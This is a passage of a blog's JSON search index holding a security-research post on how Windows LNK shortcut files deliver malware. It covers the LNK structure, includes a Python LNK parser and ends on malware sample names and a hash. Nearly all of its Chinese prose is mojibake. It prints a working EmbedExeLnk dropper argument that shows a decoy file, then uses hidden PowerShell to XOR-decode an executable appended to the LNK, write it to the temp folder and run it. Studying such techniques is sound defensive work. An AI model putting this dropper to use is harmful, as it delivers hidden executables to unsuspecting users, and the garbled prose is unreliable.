
[{"content":"å—¨ æˆ‘è²å¦\næ™‚éš”å¿«åŠå¹´çš„æ›´æ–°\u0026hellip;\nå†ä¾†æƒ³ç ”ç©¶å®‰å“ game hacking\nDiscord çš„ Nitro æ²’äº† qq\nä¸Šæ¬¡æ›´æ–°æ™‚é–“: 2025-5-6\r","date":"6 May 2025","externalUrl":null,"permalink":"/","section":"betan423.github.io","summary":"å—¨ æˆ‘è²å¦","title":"betan423.github.io","type":"page"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/tags/research/","section":"Tags","summary":"","title":"Research","type":"tags"},{"content":"","date":"6 May 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\råˆ†æäº† LNK file æ˜¯å¦‚ä½•è¢«ç”¨ä½œæ”»æ“Šï¼Œä¸¦å¾ LNK çµæ§‹é–‹å§‹ä»‹ç´¹ï¼Œä¸¦ä»‹ç´¹æ”»æ“Šæ‰‹æ³• embedexelnk æ˜¯å¦‚ä½•å¯¦ç¾çš„ï¼Œä»¥åŠåˆ†æç¾æœ‰æƒ¡æ„ç¨‹å¼ä¸¦èªªæ˜è©²å¦‚ä½•é é˜²\rå‰è¨€ #\råœ¨ä»Šå¹´(2025)çš„è³‡å®‰å¤§æœƒä¸­ï¼Œ\nè†è½äº†ä¸€å ´æœ‰é—œ LNK æ–‡ä»¶æ˜¯å¦‚ä½•ä½œç‚ºæƒ¡æ„è»Ÿé«”æ”»æ“Šåª’ä»‹çš„è­°ç¨‹ï¼Œ\né€™å ´è­°ç¨‹å¼•ç™¼äº†æˆ‘å°æ–¼é€™éƒ¨åˆ†çš„ç ”ç©¶èˆˆè¶£ï¼Œ\nä¹Ÿä¿ƒä½¿æˆ‘é–‹å§‹æ·±å…¥ç ”ç©¶ LNK çš„ç›¸é—œå…§å®¹ã€‚\né€éæœ¬æ–‡ç« ï¼Œä½ å°‡äº†è§£æƒ¡æ„è»Ÿé«”ç‚ºä½•ä»¥åŠå¦‚ä½•åˆ©ç”¨ LNK file ä½œç‚ºä¸€éšæ®µçš„æ”»æ“Šè·³æ¿ï¼Œ\né€²ä¸€æ­¥äº†è§£ Embedexelnk çš„æ”»æ“Šæ‰‹æ³•ï¼Œä¸¦èªªæ˜å¦‚ä½•é é˜²æ­¤é¡å¨è„…ï¼Œ\nè€Œæœ€å¾Œä¹Ÿæœƒæä¾›ä¸€äº›å¯è¡Œçš„é é˜²å»ºè­°èˆ‡é˜²è­·ç­–ç•¥æ–¹å‘ã€‚\nå¦å¤–ï¼Œæˆ‘ä¹Ÿæœ‰åœ¨ç ”ç©¶æ™‚éš¨æ‰‹ç´€éŒ„ hackmdï¼Œ\nä¹Ÿæ­¡è¿ä¸€ä½µæŸ¥çœ‹ã€‚\nhttps://hackmd.io/@betan/HJhUTwmkge\næ¦‚å¿µ #\rWHAT \u0026amp; WHY LNK #\ré¦–å…ˆæˆ‘å€‘è¦å…ˆäº†è§£ LNK æª”æ¡ˆåˆ°åº•ç‚ºä½•ï¼Œ\nLNK æª”æ¡ˆç°¡å–®ä¾†è¬›å°±æ˜¯æˆ‘å€‘å¸¸åœ¨æ¡Œé¢ä½¿ç”¨çš„é€£çµï¼Œ\nç”¨æ–¼å¿«é€Ÿæ‰“é–‹å…¶ä»–å­˜æ”¾åœ¨é›»è…¦å…¶ä»–åœ°æ–¹çš„æª”æ¡ˆï¼Œ\næ­£å¸¸çš„ä½¿ç”¨æ˜¯é€™æ¨£çš„ã€‚\né‚£ç‚ºä»€éº¼é§­å®¢æœƒä½¿ç”¨ LNK æª”æ¡ˆç•¶ä½œç¬¬ä¸€éšæ®µçš„æ”»æ“Šè·³æ¿å‘¢ï¼Ÿ\næˆ‘èªç‚ºä¸»è¦åŸå› æœ‰ä»¥ä¸‹å¹¾é»ï¼Œ\n1. æ­£å¸¸ä»‹é¢ä¸­çœ‹ä¸åˆ°å‰¯æª”å (.lnk)\nåœ¨ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ä¸­ï¼Œè‹¥æœ‰åœ¨æª”æ¡ˆç¸½ç®¡ä¸­é–‹å•Ÿã€Œé¡¯ç¤ºå‰¯æª”åã€çš„åŠŸèƒ½ï¼Œ\nå‰‡æœƒé¡¯ç¤ºå‡ºå„é¡å‹æª”æ¡ˆçš„å‰¯æª”åï¼Œä¾‹å¦‚ .exe, .jpg, .png ä¹‹é¡çš„æª”æ¡ˆé¡å‹ï¼Œ\nä½†åœ¨ LNK æª”æ¡ˆä¸­ï¼Œä¸¦ä¸æœƒé¡¯ç¤ºå‡ºå‰¯æª”åç‚º.lnkï¼Œ\né™¤éæ˜¯åœ¨ cmd ä¸­ä½¿ç”¨ dir ä¹‹é¡çš„åŠŸèƒ½æ‰æœƒé¡¯ç¤ºå‡º .lnkã€‚\n2. Iconã€ åç¨±ã€ æè¿°éƒ½å¯ä»¥è‡ªè¨‚\nå¦‚å‰é¢æ‰€æåˆ°çš„ï¼Œç”±æ–¼ä¸æœƒé¡¯ç¤ºå‡ºå‰¯æª”åï¼Œ\nä¹Ÿå› æ­¤æª”æ¡ˆåç¨±å°±èƒ½èµ·åˆ°å¾ˆå¥½çš„æ··æ·†ï¼Œ\nä¸¦ä¸” LNK æª”çš„åœ–ç¤º(Icon)ä¹Ÿèƒ½ä»»æ„è‡ªè¨‚ï¼Œ\nä¾‹å¦‚ç›´æ¥ä½¿ç”¨ç³»çµ±åŸç”Ÿçš„åœ–ç¤ºï¼Œåˆæˆ–æ˜¯è‡ªå·±å»ºç«‹ä¸€å€‹ .ico çš„åœ–ç‰‡ä¾†ç•¶ä½œåœ–ç¤ºï¼Œ\næ›´ç”šè‡³é€£æè¿°éƒ½å¯ä»¥è‡ªè¨‚ç‚ºæƒ³è¦çš„å…§å®¹ï¼Œ\nåœ¨æ­£å¸¸é€£çµä¸­ï¼Œç•¶ä½ æŠŠæ»‘é¼ æ”¾åœ¨è©²é€£çµä¸Šï¼Œ\nå‰‡æœƒé¡¯ç¤ºå‡ºè©²é€£çµæœ€çµ‚æŒ‡å‘çš„ç›®æ¨™ï¼Œä¾‹å¦‚ cmd.exeã€ discord.exeï¼Œ ä½†æˆ‘å€‘é€éè‡ªè¨‚æè¿°ï¼Œå‰‡å¯ä»¥ä»»æ„ä¿®æ”¹è©²æ•ˆæœï¼Œ\nè®Šæˆè®“å®ƒé¡¯ç¤ºå‡ºè‡ªè¨‚çš„å…§å®¹ã€‚\nä¾‹å¦‚é€éå°‡ LNK æª”æ¡ˆæ”¹åç‚º notepad.exeï¼Œ\nä¸¦ä¸”ä¿®æ”¹ LNK æª”æ¡ˆçš„ Icon ç‚º notepad çš„ Iconï¼Œ\næœ€å¾Œå†ä¿®æ”¹æ•´é«”æè¿°ç‚ºä¸€å€‹æ­£å¸¸çš„æª”æ¡ˆæè¿°ï¼Œ\nä¾¿èƒ½è¼•æ˜“å½è£æˆæ­£å¸¸æª”æ¡ˆã€‚\n3. å¥½æ’°å¯«\né€™éƒ¨åˆ†å…¶å¯¦æœ‰é»è¦‹ä»è¦‹æ™º(?)ï¼Œ\nä½†å°æˆ‘é€™å€‹é–‹ç™¼èƒ½åŠ›æ»¿çˆ›çš„äººï¼Œ\néƒ½èƒ½æ»¿è¼•æ˜“ç†è§£æ•´é«”çµæ§‹ä¸¦ä¸”æ’°å¯«å‡ºé¡ä¼¼çš„ LNK æª”ï¼Œ\nå¤§æ¦‚å°±èƒ½èªªæ˜é€™ä¸Šæ‰‹é›£åº¦æœ‰å¤šä½äº†ã€‚\næ‰‹æ³• #\ré€šå¸¸ä½¿ç”¨ LOLBins(Living Off the Land Binaries) ä¾†åŸ·è¡Œæ”»æ“Šï¼Œ\nä¾‹å¦‚ cmd, powershell, winrm, mshta ç­‰å…§å»ºå·¥å…·ï¼Œ\nä¸¦ä¸”ç”±æ–¼æ˜¯é€éå‘¼å«æœ¬æ©Ÿå°±æœ‰çš„ç¨‹å¼ï¼Œ\nå› æ­¤ä¹Ÿè¼ƒä¸å®¹æ˜“è¢«åµæ¸¬åˆ°æƒ¡æ„è¡Œç‚ºã€‚\nå¯é€éå¡«å……å¤§é‡ç©ºæ ¼ï¼Œä½¿æŸ¥çœ‹å…§å®¹æ™‚åªèƒ½çœ‹åˆ°ä¸€å †ç©ºç™½ï¼Œ\nåœ¨æŸ¥çœ‹è©³ç´°å…§å®¹ä¸­çš„ç›®æ¨™æ¬„ä½ï¼Œæœ€å¤šåªèƒ½é¡¯ç¤ºå‡º259å€‹å­—å…ƒ(åŒ…å«ç©ºæ ¼)ï¼Œ\nå› æ­¤è‹¥å°‡æƒ¡æ„ payload å¯«åœ¨è¶…å‡ºçš„ç¯„åœå¾Œï¼Œ\né™¤éä½¿ç”¨å·¥å…·å¦å‰‡æ˜¯ä¸èƒ½æŸ¥çœ‹è©²å®Œæ•´è¡Œç‚ºä½•çš„ã€‚\næª¢è¦–å¦‚ä¸‹åœ–ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ç›®æ¨™çš„æ¬„ä½å…¨éƒ¨å…§å®¹éƒ½æ˜¯ç©ºç™½ï¼Œ\né€™å°±æ˜¯å› ç‚ºæˆ‘å€‘å¡«å……äº†å¤§é‡çš„ç©ºæ ¼å› æ­¤åªèƒ½æŸ¥çœ‹åˆ°ç©ºç™½ã€‚ LNK çµæ§‹ #\rLNK æª”æ¡ˆçš„çµæ§‹å¦‚ä¸‹ï¼Œ\nHeader â€“\u0026gt; TargetIDList(optional) â€“\u0026gt; LinkInfo(optional) â€“\u0026gt; StringData(optional) â€“\u0026gt; ExtraData(optional)\né€™é‚Šç”±æ–¼ç¯‡å¹…åŸå› ä¸å…¨éƒ¨ä»‹ç´¹ï¼Œ\nåªç°¡å–®ä»‹ç´¹ Header èˆ‡ TargetIDList çš„å¤§è‡´å…§å®¹ï¼Œ\nè‹¥æƒ³äº†è§£å…¶é¤˜æ›´è©³ç´°çš„éƒ¨åˆ†ï¼Œæ­¡è¿æŸ¥çœ‹å¾®è»Ÿå®˜æ–¹æ’°å¯«çš„ LNK çµæ§‹ä»‹ç´¹ã€‚\n[MS-SHLLINK]: Shell Link (.LNK) Binary File Format\nHeader Header ç‚ºæ‰€æœ‰ LNK æª”ä¸­çš„æ¨™æº–é–‹é ­æ ¼å¼ï¼Œé•·åº¦ç‚º 76 bytesï¼Œ åœ¨æª”æ¡ˆçš„é–‹é ­éƒ½é ˆæŒ‰ç…§é€™å€‹å›ºå®šæ ¼å¼ä¾†æ’°å¯«ï¼Œå¦å‰‡å°‡ç„¡æ³•æ­£å¸¸æ‰“é–‹ã€‚ å…¶ä¸­éœ€ç‰¹åˆ¥æ³¨æ„ LinkFlags çš„éƒ¨åˆ†ï¼Œ\nè©²å…§å®¹æœƒæ±ºå®šåˆ°å¾ŒçºŒæ˜¯å¦æœ‰ TargetIDList, LinkInfo ç­‰çµæ§‹ã€‚\né …ç›® bytes å…§å®¹ HeaderSize 4 å›ºå®š0x0000004C LinkCLSID 16 å›ºå®š0x00021401-0000-0000-C000-000000000046 LinkFlags 4 å®šç¾©å¾ŒçºŒçµæ§‹ FileAttributes 4 èªªæ˜ç›®æ¨™æ–‡ä»¶ç‹€æ…‹ CreationTime 8 å°±æ˜¯æ™‚é–“ AccessTime 8 å°±æ˜¯æ™‚é–“ WriteTime 8 å°±æ˜¯æ™‚é–“ FileSize 4 è·¯å¾‘ç›®æ¨™å¤§å° IconIndex 4 LNK ICON(é€šå¸¸ç‚º0) ShowCommand 4 è¨­å®šç›®æ¨™å¦‚ä½•å•Ÿå‹•(å…§å®¹å›ºå®šç‚º0x1, 0x3, 0x7) HotKey 2 é–‹å•Ÿæ·å¾‘å¿«æ·éµ(æ³¨1) Reserved1 2 ä¿ç•™å­—å…ƒï¼Œå¿…ç‚º0 Reserved2 4 ä¿ç•™å­—å…ƒï¼Œå¿…ç‚º0 Reserved3 4 ä¿ç•™å­—å…ƒï¼Œå¿…ç‚º0 æ³¨1:\nHotKeyæ˜¯æˆ‘èªç‚ºä¸€å€‹é‚„æ»¿é…·çš„åŠŸèƒ½ï¼Œ\nè©²åŠŸèƒ½é ˆå°‡é€£çµæ”¾ç½®åœ¨æ¡Œé¢ä¸Šæ‰èƒ½ç”Ÿæ•ˆï¼Œ\nLowByte (å‰1 byte)ç‚ºéµç›¤æŒ‰éµ(ä¾‹å¦‚A,B,C\u0026hellip;) ã€HighByte (å¾Œ1 byte) ç‚º æ§åˆ¶æŒ‰éµ(ctrl, shift, alt)ï¼Œ\nå‡è¨­è¨­å®šæˆ0x4301ï¼Œä»£è¡¨åŒæ™‚æŒ‰ä¸‹ shift + B å³å¯é–‹å•Ÿè©² LNK æª”ï¼Œ\nä¸”ä¸è«–åœ¨å“ªå€‹è¦–çª—æŒ‰ä¸‹éƒ½èƒ½é–‹å•Ÿã€‚\nå› æ­¤å¦‚æœå°‡è©²ç†±éµè¨­å®šæˆ Ctrl + A çš„è©±ï¼Œ\nå°±ç­‰æ–¼ä½ æ¯æ¬¡ä½¿ç”¨å…¨é¸åŠŸèƒ½æ™‚éƒ½æœƒé–‹å•Ÿè©²é€£çµã€‚\nTargetIDList\réœ€åœ¨ LinkFlags å®šç¾©æœ‰ HasTargetIDList æ‰æœƒæœ‰è©²é …ç›®ï¼Œ\næ¥çºŒåœ¨ Header å¾Œï¼Œ å‰ 2 bytes ç‚ºæ•´å€‹ TargetIDListé•·åº¦ï¼Œ\nå†ä¾†çš„å…§å®¹éƒ½æ˜¯ä¸æ–·é‡è¤‡ é•·åº¦(2 bytes)ã€å…§å®¹(æ ¹æ“šå‰é¢å®šç¾©çš„é•·åº¦)ï¼Œ\nç›´åˆ°æœ€å¾Œè·‘å®Œæ•´å€‹å…ˆå‰å®šç¾©çš„é•·åº¦ã€‚\nä¾‹å¦‚ç¯„ä¾‹ä¸­çš„ 0x00E7 (ç”±æ–¼ little endian æ‰€ä»¥è¦å€’è‘—çœ‹)ä»£è¡¨æ•´å€‹ TargetIDList çš„é•·åº¦ç‚º 0xE7ï¼Œ\nè€Œæ¥ä¸‹ä¾†çš„ 0x14 å‰‡è¡¨ç¤ºäº† item 1 çš„æ•´å€‹é•·åº¦ç‚º 0x14 bytes (åŒ…å«å®šç¾©é•·åº¦çš„ 2 bytes )ï¼Œ\n0x4E ~ 0x61 å³ç‚º item 1 çš„å®Œæ•´å…§å®¹ï¼Œ\nè€Œå‰©ä¸‹çš„itemä¹Ÿéƒ½æ˜¯åŒæ¨£æ ¼å¼ï¼Œä¸€ç›´åˆ°è·‘å®Œæ•´å€‹ TargetIDList çš„é•·åº¦ã€‚\nè€Œæˆ‘å€‘é€éäº†è§£æ•´å€‹ LNK çš„çµæ§‹å¾Œï¼Œ å°±èƒ½å¤ å»æ’°å¯«ä¸€å€‹ç°¡æ˜“çš„ python ä¾†å»è®€å–æ•´å€‹ LNK file çš„çµæ§‹ã€‚\nä»¥ä¸‹ç¨‹å¼ç¢¼åªç°¡å–®è®€å–äº† LinkFlags èˆ‡ TargetIDList å…§å®¹ã€‚\nå±•é–‹ç¨‹å¼ç¢¼\rdef LinkFlags(num): flags = [ (0, \u0026#39;HasLinkTargetIDList\u0026#39;), (1, \u0026#39;HasLinkInfo\u0026#39;), (2, \u0026#39;HasName\u0026#39;), (3, \u0026#39;HasRelativePath\u0026#39;), (4, \u0026#39;HasWorkingDir\u0026#39;), (5, \u0026#39;HasArguments\u0026#39;), (6, \u0026#39;HasIconLocation\u0026#39;), (7, \u0026#39;IsUnicode\u0026#39;), (8, \u0026#39;ForceNoLinkInfo\u0026#39;), (9, \u0026#39;HasExpString\u0026#39;), (10, \u0026#39;RunInSeparateProcess\u0026#39;), (11, \u0026#39;Unused1\u0026#39;), (12, \u0026#39;HasDarwinID\u0026#39;), (13, \u0026#39;RunAsUser\u0026#39;), (14, \u0026#39;HasExpIcon\u0026#39;), (15, \u0026#39;NoPidlAlias\u0026#39;), (16 , \u0026#39;Unused2\u0026#39;), (17, \u0026#39;RunWithShimLayer\u0026#39;), (18, \u0026#39;ForceNoLinkTrack\u0026#39;), (19, \u0026#39;EnableTargetMetadata\u0026#39;), (20, \u0026#39;DisableLinkPathTracking\u0026#39;), (21, \u0026#39;DisableKnownFolderTracking\u0026#39;), (22, \u0026#39;DisableKnownFolderAlias\u0026#39;), (23, \u0026#39;AllowLinkToLink\u0026#39;), (24, \u0026#39;UnaliasOnSave\u0026#39;), (25, \u0026#39;PreferEnvironmentPath\u0026#39;), (26, \u0026#39;KeepLocalIDListForUNCTarget\u0026#39;), ] enabled = [] for bit, name in flags: if (num \u0026gt;\u0026gt; bit) \u0026amp; 1: enabled.append(name) return enabled def FileAttributesFlags(num): flags = [ (0, \u0026#39;FILE_ATTRIBUTE_READONLY\u0026#39;), (1, \u0026#39;FILE_ATTRIBUTE_HIDDEN\u0026#39;), (2, \u0026#39;FILE_ATTRIBUTE_SYSTEM\u0026#39;), (3, \u0026#39;Reserved1\u0026#39;), (4, \u0026#39;FILE_ATTRIBUTE_DIRECTORY\u0026#39;), (5, \u0026#39;FILE_ATTRIBUTE_ARCHIVE\u0026#39;), (6, \u0026#39;Reserved2\u0026#39;), (7, \u0026#39;FILE_ATTRIBUTE_NORMAL\u0026#39;), (8, \u0026#39;FILE_ATTRIBUTE_TEMPORARY\u0026#39;), (9, \u0026#39;FILE_ATTRIBUTE_SPARSE_FILE\u0026#39;), (10, \u0026#39;FILE_ATTRIBUTE_REPARSE_POINT\u0026#39;), (11, \u0026#39;FILE_ATTRIBUTE_COMPRESSED\u0026#39;), (12, \u0026#39;FILE_ATTRIBUTE_OFFLINE\u0026#39;), (13, \u0026#39;FILE_ATTRIBUTE_NOT_CONTENT_INDEXED\u0026#39;), (14, \u0026#39;FILE_ATTRIBUTE_ENCRYPTED\u0026#39;) ] enabled = [] for bit, name in flags: if (num \u0026gt;\u0026gt; bit) \u0026amp; 1: enabled.append(name) return enabled def rev(bt): # little endian æ› big endian bytes_data = bytes.fromhex(bt) reordered = bytes_data[::-1] # åè½‰ linkflags_int = int.from_bytes(reordered, byteorder=\u0026#39;big\u0026#39;) return linkflags_int def read_lnk_structure(data): structure = {} # æª¢æŸ¥é–‹é ­çš„ 20 bytes (HeaderSize) header_size = data[:20] if header_size == b\u0026#39;\\x4C\\x00\\x00\\x00\\x01\\x14\\x02\\x00\\x00\\x00\\x00\\x00\\xc0\\x00\\x00\\x00\\x00\\x00\\x00\\x46\u0026#39;: structure[\u0026#39;HeaderSize_Valid\u0026#39;] = True else: print(\u0026#39;Wrong file! NOT LNK file\u0026#39;) return \u0026#39;-1\u0026#39; # LinkFlags (4 bytes) link_flags = data[20:24] structure[\u0026#39;LinkFlags\u0026#39;] = LinkFlags(rev(link_flags.hex())) # FileAttributesFlags (4 bytes) File_Attributes_Flags = data[24:28] structure[\u0026#39;FileAttributesFlags\u0026#39;] = FileAttributesFlags(rev(File_Attributes_Flags.hex())) # HotKey (2 bytes) Hot_Key = data[0x40:0x42] if (Hot_Key == b\u0026#39;\\x00\\x00\u0026#39;): structure[\u0026#39;HotKey\u0026#39;] = \u0026#39;NO\u0026#39; else: key =\u0026#39;\u0026#39; if data[0x41] \u0026amp; 0x01: key+=(\u0026#39;SHIFT \u0026#39;) if data[0x41] \u0026amp; 0x02: key+=(\u0026#39;CTRL \u0026#39;) if data[0x41] \u0026amp; 0x04: key+=(\u0026#39;ALT \u0026#39;) structure[\u0026#39;HotKey\u0026#39;] = chr(data[0x40]) , key return structure def check_item(data,num,ed): item = [] ed-=2 while ed != 0: size = rev(data[num:num+2].hex()) ed -= size item.append(data[num:num+size]) num = num+size return item def LinkTargetIDList(data): size = rev(data [76:78].hex()) item =check_item(data,78,size) for idx, content in enumerate(item, start=1): hex_string = \u0026#39;\u0026#39;.join(f\u0026#39;\\\\x{b:02x}\u0026#39; for b in content) print(f\u0026#34;item {idx}: {hex_string}\u0026#34;) return 78+size def HasLinkInfo(data): print(\u0026#39;test\u0026#39;) return 1 if __name__ == \u0026#34;__main__\u0026#34;: lnk_path = \u0026#34;Your path\u0026#34; with open(lnk_path, \u0026#39;rb\u0026#39;) as f: data = f.read() result = read_lnk_structure(data) for k, v in result.items(): print(f\u0026#34;{k}: {v}\u0026#34;) if \u0026#39;HasLinkTargetIDList\u0026#39; in (result[\u0026#39;LinkFlags\u0026#39;]): print(\u0026#39;--- has TargetIDList ---\u0026#39;) now = LinkTargetIDList(data) print(now) if \u0026#39;HasLinkInfo\u0026#39; in (result[\u0026#39;LinkFlags\u0026#39;]): print(\u0026#39;--- has HasLinkInfo ---\u0026#39;) HasLinkInfo(data) print(now) EmbedExeLnk #\ræœ¬å…§å®¹åƒè€ƒç”± d4rkiZ æ”¹è‰¯éå¾Œçš„ EmbedExeLnk æŠ€å·§ã€‚\nd4rkiZ/EmbedExeLnk-\rEmbedExeLnk by x86matthew modified by d4rkiZ\rC\u0026#43;\u0026#43; 42\r11\ræ¦‚å¿µ #\rç”±æ–¼ LNK æª”å°æ–¼çµæ§‹çš„æª¢æŸ¥ä¸¦æ²’æœ‰å¾ˆåš´è‹›ï¼Œ\nå› æ­¤æˆ‘å€‘å¯ä»¥å¡ä»»æ„å…§å®¹åˆ° LNK æª”çš„æœ«ç«¯éƒ½ä¸æœƒå½±éŸ¿åˆ°æª”æ¡ˆçš„é–‹å•Ÿã€‚\nè€Œé€™å€‹æ”»æ“Šæ‰‹æ®µå°±æ˜¯é€éå…§åµŒ exe æª”åˆ° LNK æª”çš„æœ«å°¾ä¸­ï¼Œ\nä»¥é”åˆ°ä¸éœ€è¦åˆ° C2 ä¸‹è¼‰æª”æ¡ˆå°±èƒ½åŸ·è¡Œæƒ¡æ„ç¨‹å¼çš„æ“ä½œï¼Œ\nä½†ä¹Ÿä¸¦éåªæœ‰ exe æª”æ‰å¯ä»¥ä½¿ç”¨æ­¤æŠ€å·§ï¼Œ\nåŸºæœ¬ä¸Šä»»ä½•æ ¼å¼çš„å…§å®¹éƒ½å¯ä»¥åµŒåˆ° LNK æª”çš„æœ«ç«¯ã€‚\nLinkFlags å…§å®¹ #\ré€™é‚Šå…ˆæŸ¥çœ‹ä¸€ä¸‹ä»–åœ¨ LinkFlags ä¸­ä½¿ç”¨äº†é‚£äº›é …ç›®ä»¥åŠåŠŸèƒ½ç‚ºä½•ã€‚\nLinkFlags HasName (ç”¨æ–¼æ–°å¢æè¿°) saved with a name string, NAME_STRING StringData structure must be present HasArguments (ä½¿ç”¨ç’°å¢ƒè®Šæ•¸) has command line argumentsï¼ŒCOMMAND_LINE_ARGUMENTS StringData structure must be present HasIconLocation (è‡ªè¨‚ Icon) ICON_LOCATION StringData structure MUST be present IsUnicode StringData contains Unicode-encoded strings HasExpString æœ‰ç’°å¢ƒè®Šæ•¸å…§å®¹ï¼Œéœ€å†EnvironmentVariableDataBlockè¨­å®š PreferEnvironmentPath æ²’æœ‰ID listï¼Œç”¨ç’°å¢ƒè®Šæ•¸æ›¿ä»£ The target IDList SHOULD NOT be stored; instead, the path specified in the EnvironmentVariableDataBlock (section 2.5.4) SHOULD be used to refer to the target. ä¸ä½¿ç”¨å¸¸è¦‹çš„TargetIDList ï¼Œè€Œæ˜¯é€é PreferEnvironmentPath å°‡å…§å®¹ä¸Ÿåˆ° ExtraData\nCommand line arguments #\ré€éå…ˆé–‹å•Ÿ Google Chrome å…§å»ºçš„å¼±å¯†ç¢¼æœ¬ï¼Œ\nä¾†æ¬ºé¨™è¢«å®³è€…ä»¥ç‚ºé–‹å•Ÿçš„æ˜¯æ­£å¸¸ txt æ–‡ä»¶ï¼Œ\nè€Œå¾Œé€éå…ˆéæ­·æ•´å€‹ç•¶å‰ç›®éŒ„çš„æ‰€æœ‰ lnk æª”æ¡ˆï¼Œä¾†æ‰¾åˆ°æ­¤æƒ¡æ„ LNKï¼Œ\næ¥è‘—è®€å– LNK ä¸­æœ€æœ«ç«¯åŠ å¯†å¾Œçš„ exe æª”å…§å®¹ï¼Œè§£å¯†ä¸¦å­˜æ”¾åˆ° tmp æª”ä¸­ï¼Œ\næœ€å¾Œå°±æ˜¯åŸ·è¡Œè©² exe æª”ã€‚\n/c start notepad C:\\\\%%HOMEPATH%%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData\\\\3\\\\passwords.txt \u0026amp;\u0026amp; powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq 0x00000000} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x%02X }; $path = \u0026#39;%%temp%%\\\\tmp\u0026#39; + (Get-Random) + \u0026#39;.exe\u0026#39;; sc $path ([byte[]]($file ^| select -Skip 000000)) -Encoding Byte; ^\u0026amp; $path; æˆ‘å€‘åœ¨åŸ·è¡Œè©² lnk æª”å¾Œï¼Œå¯ä»¥çœ‹åˆ°å°±é–‹å•Ÿäº†å¼±å¯†ç¢¼ txt æœ¬ï¼Œ\nä»¥åŠä¹Ÿé‹è¡Œäº†æˆ‘æ’°å¯«çš„ä¸€å€‹ç°¡å–® MessageBox exe fileï¼Œ\nå°±é€™æ¨£æ”¶åˆ°äº†ä¸€ä»½æ´—åŠ«ç…é€ä¾†çš„å‚³ç¥¨äº†ã€‚ çµæ§‹åˆ†æ #\ræˆ‘å€‘å¾ç¨‹å¼ç¢¼ä¾†çœ‹ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­å®šç¾©çš„çµæ§‹å¦‚ä¸‹ï¼Œ\nheader \u0026ndash;\u0026gt; description_length \u0026ndash;\u0026gt; description \u0026ndash;\u0026gt; CommandLineArguments \u0026ndash;\u0026gt; IconLocationLength \u0026ndash;\u0026gt; IconLocation \u0026ndash;\u0026gt; EnvironmentVariableDataBlock \u0026ndash;\u0026gt; ExeFile\nå…¶ä¸­ description, CommandLineArguments, IconLocation ä½æ–¼ StringData ä¸­ï¼Œ\nEnvironmentVariableDataBlock å‰‡æ˜¯ä½æ–¼ ExtraData ä¸­ã€‚\nHeader (0 ~ 4B bytes)\nçµæ§‹å°±å¦‚\rå‰é¢ æ‰€æåŠï¼Œé€™é‚Šå°±ä¸éå¤šè´…è¿°ã€‚ ç”±æ–¼å¤§å¤šæ•¸çµæ§‹éƒ½ä¸å½±éŸ¿ LNK æª”ï¼Œ å› æ­¤é€™é‚Šå°±å°‡å…¶é¤˜æ•¸å€¼éƒ½å¡« 0ã€‚ StringData - NAME_STRING (4C ~ CF bytes)\nè§£é‡‹ä¸€ä¸‹é•·åº¦ï¼Œ 0x41 = 65 ï¼Œç„¶å¾Œæˆ‘å€‘éœ€è¦å°‡é•·åº¦ * 2 æ‰æœƒæ˜¯å¾ŒçºŒå…§å®¹çš„é•·åº¦ï¼Œå› æ­¤ 65 * 2 = 130 ï¼Œ å¾ŒçºŒå…§å®¹å¾ 4E ~ D0 çš„é•·åº¦å°±å‰›å¥½æ˜¯130 StringData - COMMAND_LINE_ARGUMENTS (D0 ~ 885 bytes)\nStringData - ICON_LOCATION (886 ~ 8C1 bytes)\nExtraData - ENVIRONMENT_PROPS (8C2 ~ BD6 bytes)\nexe file (BD6 ~ FDD6 bytes)\nxor 0x77 å¾Œçš„å…§å®¹ï¼Œé€™é‚Šå°±ä¸éå¤šè´…è¿° å¯¦ä¾‹ #\ré€™é‚Šå°‡åˆ†æäº”å€‹å¯¦éš›çš„æ¨£æœ¬ï¼Œå…¶ä¸­ä¸‰å€‹ç‚ºè­°ç¨‹ä¸­æåŠåˆ°çš„æ¨£æœ¬ï¼Œ\nå‰©ä¸‹ä¸€å€‹æ˜¯é‡å¤–çš„ LNK æƒ¡æ„ç¨‹å¼ï¼Œæœ€å¾Œä¸€å€‹å‰‡æ˜¯ä½¿ç”¨äº† Embedexelnk çš„æŠ€å·§ã€‚\næœ¬æ¬¡ç ”ç©¶ä¸»è¦æ˜¯ç ”ç©¶ LNK çš„æƒ¡æ„è¡Œç‚ºï¼Œ\nå› æ­¤æ²’æœ‰å†å°å¾ŒçºŒçš„æƒ¡æ„ç¨‹å¼é€²è¡Œæ›´é€²ä¸€æ­¥çš„åˆ†æã€‚\nPuppetFox, RolandSkimmer, Confucius #\rç”±æ–¼æœ¬éƒ¨åˆ†éƒ½æ²’æœ‰ä¸‹è¼‰åˆ°åŸå§‹æ¨£æœ¬ï¼Œ\nå› æ­¤é€™é‚Šæˆ‘åªèƒ½é€éå» VirusTotal é€²è¡ŒæŸ¥è©¢ï¼Œ\nä½†å¹¸é‹çš„æ˜¯ï¼Œåœ¨ VT ä¸­å°±èƒ½æŸ¥çœ‹è©³ç´°çš„ LNK æŒ‡å‘ç›®æ¨™å…§å®¹äº†ï¼\nç”±æ–¼åœ¨ VT ä¸­æœƒè‡ªå‹•å°‡éé•·çš„å…§å®¹å¾ŒçºŒçœç•¥ç‚º \u0026hellip;\nä½†æˆ‘å€‘èƒ½é€éç›´æ¥å°è©²é …ç›®é€éé–‹å•Ÿ F12 ä¾†æŸ¥çœ‹å®Œæ•´å…§å®¹ï¼Œ\nåˆæˆ–æ˜¯ä¹Ÿèƒ½åœ¨ BEHAVIOR ä¸­çš„ Processes created çœ‹åˆ°å®Œæ•´é€²ç¨‹ã€‚\nBro ä»¥ç‚ºè‡ªå·±åœ¨æ‰“ CTF æ‰¾ Flag\nHash å€¼:\nPuppetFox 3d8db6e02bd11a4366b02bfb94593ff410d183a94134933121c806a5f175f8a3 